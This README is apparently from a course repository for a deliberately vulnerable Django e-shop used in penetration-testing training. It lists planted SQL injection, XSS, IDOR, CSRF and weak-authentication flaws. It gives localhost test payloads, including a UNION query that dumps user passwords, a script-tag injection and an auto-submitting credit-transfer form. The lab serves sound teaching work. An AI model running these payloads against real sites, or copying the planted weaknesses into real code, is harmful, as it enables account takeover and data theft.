# E-Shop Vulnerable Version - CDS201 Penetration Testing

⚠️ **WARNING: This application contains intentional security vulnerabilities for educational purposes only!**

## Overview

This is the intentionally vulnerable version of the E-Shop application, created for the CDS201 - Network and System Penetration Testing course. The application has been modified to include critical security vulnerabilities as required by the course assignment.

## Purpose

This vulnerable application serves as a target for:
- Learning web application penetration testing techniques
- Understanding common security vulnerabilities
- Practicing exploitation methods in a controlled environment
- Creating professional penetration testing reports

## Implemented Vulnerabilities (5 Major Categories)

### 1. SQL Injection
- **Location**: Product search (`/catalog/?q=`)
- **Type**: Union-based and Boolean-based
- **Impact**: Database access, data exfiltration

### 2. Cross-Site Scripting (XSS)
- **Types**: Reflected and Stored XSS
- **Locations**: Search results, product reviews, shipping forms
- **Impact**: Session hijacking, phishing, defacement

### 3. Authentication Weaknesses
- **Issues**: User enumeration, no rate limiting, weak hashing (MD5)
- **Impact**: Account takeover, brute force attacks

### 4. Insecure Direct Object Reference (IDOR) 
- **Location**: Order viewing (`/order/<order_id>/`)
- **Type**: Broken access control
- **Impact**: Access to other users' orders and personal data

### 5. Cross-Site Request Forgery (CSRF)
- **Locations**: Credit transfer, email update endpoints
- **Type**: Missing CSRF protection (@csrf_exempt)
- **Impact**: Unauthorized actions on behalf of users

### Additional Issues
- **Session Management**: Insecure cookies, no HttpOnly/Secure flags
- **Security Misconfiguration**: DEBUG=True, disabled security headers
- **Information Disclosure**: Detailed error messages, stack traces

## Quick Start

### Setup
```bash
# Clone the repository
git clone [repository-url]
cd CDS204_Project3

# Switch to vulnerable branch
git checkout vulnerable

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
cd secure_eshop
pip install -r requirements.txt

# Run migrations
python manage.py migrate

# Create test user (optional)
python manage.py createsuperuser

# Run the server (intentionally without HTTPS)
python manage.py runserver
```

### Testing Vulnerabilities

#### SQL Injection Test
```bash
# Basic test
curl "http://localhost:8000/catalog/?q=' OR '1'='1"

# Extract users
curl "http://localhost:8000/catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--"
```

#### XSS Test
```bash
# Reflected XSS
curl "http://localhost:8000/catalog/?q=<script>alert('XSS')</script>"
```

#### Authentication Test
```bash
# User enumeration
curl -X POST http://localhost:8000/login/ \
  -d "username=admin&password=wrong" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

#### IDOR Test
```bash
# Access other users' orders (requires valid session)
curl -b "sessionid=your-session-id" \
  "http://localhost:8000/order/ORD-XXXXX-XXXXX/"
```

#### CSRF Test
```html
<!-- Save as csrf_test.html and open in browser while logged in -->
<form action="http://localhost:8000/transfer-credits/" method="POST">
  <input type="hidden" name="recipient" value="attacker">
  <input type="hidden" name="amount" value="100">
</form>
<script>document.forms[0].submit();</script>
```

## Exploitation Tools

Ready-to-use exploitation scripts are provided in `scripts/exploits/`:

### 1. SQL Injection Exploit
```bash
python scripts/exploits/sql_injection_exploit.py
```
Features:
- Automated vulnerability detection
- Database extraction
- User credential dumping
- Table enumeration

### 2. XSS Exploit
```bash
python scripts/exploits/xss_exploit.py
```
Features:
- Reflected XSS testing
- Stored XSS payloads
- PoC page generation
- Various payload types

### 3. Authentication Exploit
```bash
python scripts/exploits/auth_exploit.py
```
Features:
- User enumeration
- Brute force attacks
- Timing attack analysis
- MD5 hash cracking

## Documentation

Comprehensive documentation is available in the `Documentation/` directory:

- **Vulnerability Details**: `Documentation/VULNERABILITIES/`
  - `01_SQL_INJECTION.md` - SQL injection documentation
  - `02_XSS_VULNERABILITIES.md` - XSS documentation  
  - `03_AUTHENTICATION_WEAKNESSES.md` - Auth vulnerabilities
  - `VULNERABILITY_SUMMARY.md` - Complete overview

- **Penetration Test Report**: `Documentation/PENETRATION_TEST_REPORT_TEMPLATE.md`
  - Professional report template
  - Follows industry standards
  - Ready to customize

## Important Security Notes

⚠️ **NEVER deploy this application to production or expose it to the internet!**

This application is designed to be vulnerable and should only be used:
- In isolated, controlled environments
- For educational purposes
- On localhost or private networks
- With explicit permission

## File Changes Summary

Modified files from secure version:
- `eshop/views.py` - Added SQL injection
- `eshop/forms.py` - Removed sanitization, added user enumeration
- `eshop/models/reviews.py` - New vulnerable review model
- `eshop/templates/` - Added unsafe template rendering
- `eshop_project/settings.py` - Weakened security settings
- `eshop/urls.py` - Added vulnerable endpoints

## Testing Methodology

Follow the OWASP Web Security Testing Guide:
1. **Information Gathering** - Map the application
2. **Configuration Testing** - Check for misconfigurations
3. **Identity Testing** - Test authentication mechanisms
4. **Input Validation** - Test for injection vulnerabilities
5. **Session Testing** - Analyze session management

## Deliverables

For the course assignment, prepare:
1. **Modified Source Code** - This vulnerable version
2. **Technical Report** - Use the provided template
3. **Proof of Concepts** - Screenshots and exploit demonstrations
4. **Presentation** - 15-minute overview of findings

## Recommended Tools

- **Proxy**: Burp Suite, OWASP ZAP
- **SQL Injection**: SQLMap
- **XSS**: XSStrike, BeEF
- **Brute Force**: Hydra, custom scripts
- **General**: Nikto, Nmap, Metasploit

## Support

For questions about the vulnerabilities or testing:
- Review the documentation in `Documentation/VULNERABILITIES/`
- Check the exploitation scripts for examples
- Refer to OWASP testing guides

## License

This vulnerable version is for educational use only. Do not use these vulnerabilities in production code.

---

**Remember**: The goal is to learn about security vulnerabilities in a controlled environment. Always practice ethical hacking and obtain proper authorization before testing any system.